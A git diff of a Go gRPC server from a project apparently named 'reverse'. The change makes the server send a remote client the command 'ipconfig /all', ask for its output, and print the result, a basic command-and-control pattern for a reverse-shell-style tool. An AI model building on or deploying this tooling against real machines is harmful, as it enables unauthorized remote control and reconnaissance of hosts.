@@ -2,8 +2,10 @@ package main
 
 import (
 	"context"
+	"errors"
 	"log"
 	"net"
+	"os"
 
 	pb "github.com/bartimus-primed/proto/reverse/reverse_pb"
 	"google.golang.org/grpc"
@@ -19,10 +21,21 @@ type server struct {
 }
 
 func (s *server) GetCommand(ctx context.Context, in *pb.Response) (*pb.Command, error) {
-	if in.GetReady() {
-
+	if in.GetSuccess() {
+		// Client ran command successfully
+		previous_command := in.GetRanCommand()
+		println(previous_command)
+		println(in.GetResp())
+		os.Exit(0)
 	}
-	return &pb.Command{}, nil
+	if in.GetReady() {
+		return &pb.Command{
+			Cmd:      "ipconfig /all",
+			SendResp: true,
+		}, nil
+	} else {
+		return nil, errors.New("Not Ready")
+	}
 }
 
 func (s *server) HandsOn(stream pb.ReverseInteract_HandsOnServer) error {
